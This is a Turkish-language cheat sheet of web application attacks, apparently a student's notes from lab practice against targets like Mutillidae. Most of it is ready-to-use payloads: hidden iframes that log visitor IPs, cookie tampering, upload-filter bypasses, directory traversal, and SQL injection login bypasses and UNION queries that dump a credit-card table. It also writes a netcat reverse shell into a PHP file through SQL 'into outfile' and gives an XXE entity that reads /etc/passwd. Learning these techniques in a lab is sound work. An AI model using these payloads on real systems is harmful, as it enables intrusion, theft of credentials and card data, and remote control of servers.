# Web sitesi açıkları

### HTML kodu çalıştırma
Eğer sitede html kodu çalıştırılabiliyorsa örnek:
 ```html
<iframe src="http://10.0.2.10:4545/test" height="0" width="0"></iframe>
 ```
 gibi bir kod çalıştırarak ve netcat ile de dinleyerek o siteye girenlerin ip adresi öğrenilebilir.


### İstek yakalayıp değiştirme
Burp suite ile isteği yakalayıp html koduna enjeksiyon yapıp forwardlamak.

### dosyayı uzantısını değiştirerek upload etme
Eğer .py .php gibi dosyaları engelliyorsa .py3 .php4 gibi uzantı değişiklikleri yapılarak denenebilir.

### directory traversal
/../../etc/passwd gibi geri gitme komutları kullanarak dosyalara erişmeye çalışılır.
dotdotpwn toolu ile işler otomatikleştirilebilir.

### cookie manipulasyonu
burpsuitede intercept = on yaparak cookieleri yakalamak ve çıkan parametreleri değiştirerek giriş yapmayı denemek.
Örneğin admin = 0'ı admin = 1 şeklinde değiştirip forwardlamak.

### parametreleri copy url yaparak
parametreleri copy url yaparak karşı taraf bu linki açtığında şifresinin değişmesini sağlamak

### sql injection açıkları

**POST METHOD**
```sql
SELECT * FROM accounts WHERE username='serkn' AND password='1' AND 1=1'#
```
```sql
password: 123456' AND 1=1#
```
```sql
password: 1' OR 1=1#
```
```sql
password: 1' OR 1=1--
```
    username: serkan'#

**GET METHOD**

http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=serkan&password=xv&user-info-php-submit-button=View+Account+Details

http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=serkan%27%23&password=1&user-info-php-submit-button=View+Account+Details

**UNION SELECT**
```sql
username: serkan' UNION SELECT 1# 
```
```sql
username: serkan' UNION SELECT 1,2,3,4,5#
```
    database(), user(), version()

information_schema
```sql
username: serkan' UNION SELECT 1,table_name,3,4,5 from information_schema.tables#
```

çalışmazsa 
```sql
username: serkan' UNION SELECT 1,table_name,null,null,5 from information_schema.tables#
```
filtreleme
```sql
username: serkan' UNION SELECT 1,table_name,3,4,5 from information_schema.tables WHERE table_schema = 'owasp10'#
```
```sql
username: serkan' UNION SELECT 1,column_name,3,4,5 from information_schema.columns WHERE table_name = 'credit_cards'#
```
```sql
username: serkan' UNION SELECT 1,ccnumber,ccv,expiration,5 from credit_cards#
```

**Advanced SQL**
```sql
' AND 1=1#
' OR 1=1#
'+AND+1=1#
' UnIoN+SelEct+1,2,3,4,5//
' UnIoN+SelEct+1,2,3,4,5--
' UnIoN+SelEct+1,2,3,4,5#
'%27%20UnIoN%20SelEct%201,2,3,4,5%23
1 AND 1=1
```

**LOAD_FILE('/etc/passwd')**
```sql
1' UNION SELECT 1,load_file('/etc/passwd')#
```
**INTO OUTFILE**
```sql
1' UNION SELECT 1,'test' into outfile '/tmp/test.txt'#
```
**PHP REVERSE SHELL**
```sql
<?passthru("nc 10.0.2.4 4242 -e /bin/sh");?>
```
```sql
2' union select 1,'<?passthru("nc 10.0.2.10 1234 -e /bin/sh");?>' into outfile '/tmp/myshell.php'#
```

### XXE açığı
```xml
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
```
buna benzeyen bir kod çalıştırıp sistemde görülmemesi gereken yerler görülebilir. Detaylar **cs notesde**.